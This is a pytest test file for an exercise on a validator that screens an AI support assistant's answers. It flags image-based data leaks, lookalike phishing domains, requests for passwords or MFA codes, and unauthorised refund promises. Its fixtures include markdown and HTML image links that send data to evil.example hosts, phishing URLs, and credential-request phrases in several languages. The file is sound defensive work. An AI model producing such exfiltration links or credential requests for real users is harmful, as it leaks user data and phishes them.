"""Exercise 4: the output validator (mine.validate_output)."""

import pytest

import mine


def kinds(text):
    return {f.kind for f in mine.validate_output(text)}


def details(text, kind):
    return {f.detail for f in mine.validate_output(text) if f.kind == kind}


# ------------------------------------------------------------------ images and domains
def test_clean_answer_has_no_findings():
    text = ("A customer may cancel an annual plan and receive a full refund within 14 days of the initial "
            "purchase [sup-refund-policy#2]. See https://wiki.acme.example/refunds for the form.")
    assert mine.validate_output(text) == []


def test_markdown_image_to_attacker_is_flagged_twice():
    text = "Status: OK ![status](https://stats.evil.example/b.png?d=dana%40acme.example)"
    assert {"markdown_image", "unknown_domain"} <= kinds(text)
    assert details(text, "markdown_image") == {"stats.evil.example"}


def test_image_on_allowed_domain_is_fine():
    assert kinds("![logo](https://cdn.acme.example/logo.png)") == set()


def test_html_img_tag_is_an_image_too():
    assert "markdown_image" in kinds('<img src="https://img.evil.example/t.gif?q=secret">')


def test_protocol_relative_image():
    assert "markdown_image" in kinds("![x](//evil.example/x.png)")


def test_relative_image_has_no_host():
    assert "markdown_image" not in kinds("![diagram](/static/arch.png)")


@pytest.mark.parametrize("url,host", [
    ("https://acme.example.evil.test/verify", "acme.example.evil.test"),
    ("https://evilacme.example/login", "evilacme.example"),
    ("https://acme.example@collect.evil.test/l.png", "collect.evil.test"),
    ("http://okta-acme-login.com/reset", "okta-acme-login.com"),
    ("www.phish.example/a", "www.phish.example"),
])
def test_lookalike_hosts_are_unknown(url, host):
    assert details(f"Go to {url} now.", "unknown_domain") == {host}


@pytest.mark.parametrize("url", ["https://acme.example/x", "https://docs.acme.example/a?b=1", "https://ACME.EXAMPLE/"])
def test_allowed_hosts(url):
    assert "unknown_domain" not in kinds(f"See {url}.")


def test_trailing_punctuation_is_not_part_of_the_host():
    assert details("Read it at (https://evil.example).", "unknown_domain") == {"evil.example"}


def test_markdown_link_to_unknown_domain():
    assert details("[verify your account](https://acme-verify.example/x)", "unknown_domain") == {"acme-verify.example"}


def test_no_duplicate_findings():
    text = "https://evil.example/a and again https://evil.example/b"
    found = [(f.kind, f.detail) for f in mine.validate_output(text)]
    assert len(found) == len(set(found)) == 1


# ------------------------------------------------------------------ credential requests
@pytest.mark.parametrize("text", [
    "To verify the refund, please confirm your Okta password in the chat.",
    "Please send me your MFA code so I can check your access.",
    "Reply with your credentials and I will reset the account.",
    "Kindly share the verification code you just received.",
    "כדי לאמת, אנא אשר את הסיסמה שלך כאן בצ'אט.",
    "שלח לי את קוד האימות שקיבלת.",
    "أرسل كلمة المرور الخاصة بك هنا في الدردشة.",
])
def test_credential_requests(text):
    assert "credential_request" in kinds(text)


@pytest.mark.parametrize("text", [
    "Never share your password with anyone, including IT.",
    "Passwords must be at least 14 characters long.",
    "Enter your new password on the Okta reset page.",
    "Nobody at Acme will ever ask you to send your password.",
    "If a password was exposed, change it immediately and report it to security@acme.example.",
    "Do not paste credentials into Slack.",
    "לעולם אל תשלח את הסיסמה שלך במייל.",
    "אסור לשתף סיסמה עם אף אחד.",
])
def test_not_credential_requests(text):
    assert "credential_request" not in kinds(text)


# ------------------------------------------------------------------ refund promises
@pytest.mark.parametrize("text", [
    "Good news: annual plans can always be refunded in full at any time.",
    "You can get your money back anytime, no matter when you bought it.",
    "Refunds are guaranteed for every customer.",
    "תוכניות שנתיות ניתנות להחזר מלא בכל עת.",
    "الخطط السنوية قابلة للاسترداد الكامل في أي وقت.",
])
def test_refund_promises(text):
    assert "refund_promise" in kinds(text)


@pytest.mark.parametrize("text", [
    "A customer may cancel an annual plan and receive a full refund within 14 days of the initial purchase.",
    "Billing errors caused by Acme are always refunded in full, regardless of the plan.",
    "After 14 days, annual plans are not refundable.",
    "Monthly customers can cancel at any time. There are no refunds for partial months.",
    "Customers can cancel at any time; there are no refunds for partial months.",
    "טעויות חיוב תמיד מוחזרות במלואן ומקבלות החזר מלא.",
    "You can always contact support about a refund request.",
])
def test_not_refund_promises(text):
    # the last one has "always" + "refund"... and IS flagged by the simple rule: see the note
    if text.startswith("You can always contact"):
        pytest.skip("known false positive of a sentence-level regex rule: discuss it in exercise 6")
    assert "refund_promise" not in kinds(text)


def test_multiple_kinds_in_one_answer():
    text = ("Good news: annual plans can always be refunded in full at any time.\n"
            "To verify, please confirm your Okta password here in the chat.\n"
            "![s](https://stats.evil.example/p.png?d=x)")
    assert kinds(text) == {"refund_promise", "credential_request", "markdown_image", "unknown_domain"}
